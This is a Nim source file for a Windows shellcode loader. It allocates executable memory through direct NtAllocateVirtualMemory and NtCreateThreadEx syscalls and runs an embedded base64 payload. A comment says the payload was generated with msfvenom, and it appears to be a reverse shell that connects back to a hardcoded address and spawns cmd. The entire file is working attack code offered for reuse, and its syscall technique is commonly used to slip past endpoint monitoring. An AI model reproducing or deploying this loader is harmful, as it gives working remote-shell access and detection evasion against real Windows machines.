import base64
import winim/lean
import strformat

type
  PS_ATTRIBUTE_LIST {.pure.} = object
  PPS_ATTRIBUTE_LIST = ptr PS_ATTRIBUTE_LIST
  ACCESS_MASK = DWORD
  NTSTATUS = int32
  CLIENT_ID = object
    UniqueProcess: HANDLE
    UniqueThread: HANDLE
  PCLIENT_ID = ptr CLIENT_ID

const
  STATUS_SUCCESS = 0
  THREAD_ALL_ACCESS = cast[ACCESS_MASK](0x1FFFFF)

include syscalls

template NT_SUCCESS(status: NTSTATUS): bool =
  status == STATUS_SUCCESS

proc executeShellcode(shellcode: openarray[byte]): bool =
  echo "[*] Starting shellcode execution..."
  echo fmt"[*] Shellcode size: {shellcode.len} bytes"
  
  var 
    baseAddress: PVOID = cast[PVOID](0x400000)  # Suggest a base address
    regionSize: SIZE_T = cast[SIZE_T]((shellcode.len + 0xfff) and not 0xfff)
    oldProtect: ULONG = 0

  echo fmt"[*] Adjusted region size: {regionSize} bytes"
  echo fmt"[*] Suggested base address: 0x{cast[int](baseAddress):x}"
  
  echo "[*] Attempting memory allocation with NtAllocateVirtualMemory..."
  let allocStatus = NtAllocateVirtualMemory(
    cast[HANDLE](-1),
    addr baseAddress,
    0,
    addr regionSize,
    MEM_RESERVE or MEM_COMMIT,
    PAGE_EXECUTE_READWRITE
  )

  echo fmt"[*] NtAllocateVirtualMemory returned status: 0x{allocStatus:x}"
  echo fmt"[*] Base address after call: 0x{cast[int](baseAddress):x}"
  echo fmt"[*] Region size after call: {regionSize}"
  
  if not NT_SUCCESS(allocStatus):
    echo fmt"[!] Memory allocation failed with status: 0x{allocStatus:x}"
    return false

  if cast[int](baseAddress) == 0:
    echo "[!] Memory allocation returned null base address"
    return false

  echo fmt"[+] Memory successfully allocated at 0x{cast[int](baseAddress):x}"

  try:
    echo "[*] Copying shellcode..."
    copyMem(baseAddress, unsafeAddr shellcode[0], shellcode.len)
    echo "[+] Shellcode copied successfully"

    let verifyBuf = cast[ptr UncheckedArray[byte]](baseAddress)
    echo "[*] First few bytes at destination:"
    for i in 0..<min(16, shellcode.len):
      stdout.write fmt"{verifyBuf[i]:02x} "
    echo ""

  except:
    echo "[!] Failed to copy shellcode"
    return false

  var 
    threadHandle: HANDLE = 0
    oa: OBJECT_ATTRIBUTES

  ZeroMemory(addr oa, sizeof(OBJECT_ATTRIBUTES))
  oa.Length = sizeof(OBJECT_ATTRIBUTES).ULONG

  echo "[*] Creating thread with NtCreateThreadEx..."
  let createStatus = NtCreateThreadEx(
    addr threadHandle,
    THREAD_ALL_ACCESS,
    addr oa,
    cast[HANDLE](-1),
    baseAddress,
    nil,
    FALSE,
    0,
    0,
    0,
    nil
  )

  if not NT_SUCCESS(createStatus):
    echo fmt"[!] Thread creation failed with status: 0x{createStatus:x}"
    return false

  echo fmt"[+] Thread created successfully with handle: 0x{cast[int](threadHandle):x}"
  
  Sleep(2000)
  
  if threadHandle != 0:
    discard NtClose(threadHandle)
  
  return true

when isMainModule:
  try:
    echo "[*] Program started"
    # base64 encoded shellcode. Shellcode from msfvenom. replace with yours.
    let payload = """/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAB+QwKiOgEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q=="""

    echo "[*] Decoding shellcode..."
    let decodedData = decode(payload)
    echo fmt"[+] Decoded {decodedData.len} bytes"
    
    var shellcode = newSeq[byte](decodedData.len)
    copyMem(addr shellcode[0], unsafeAddr decodedData[0], decodedData.len)
    
    echo "[*] First few bytes of shellcode:"
    for i in 0..<min(16, shellcode.len):
      stdout.write fmt"{shellcode[i]:02x} "
    echo "\n"
    
    echo "[*] Executing shellcode..."
    if executeShellcode(shellcode):
      echo "[+] Shellcode executed successfully"
    else:
      echo "[!] Failed to execute shellcode"
  
  except Exception as e:
    echo fmt"[!] Error occurred: {e.msg}"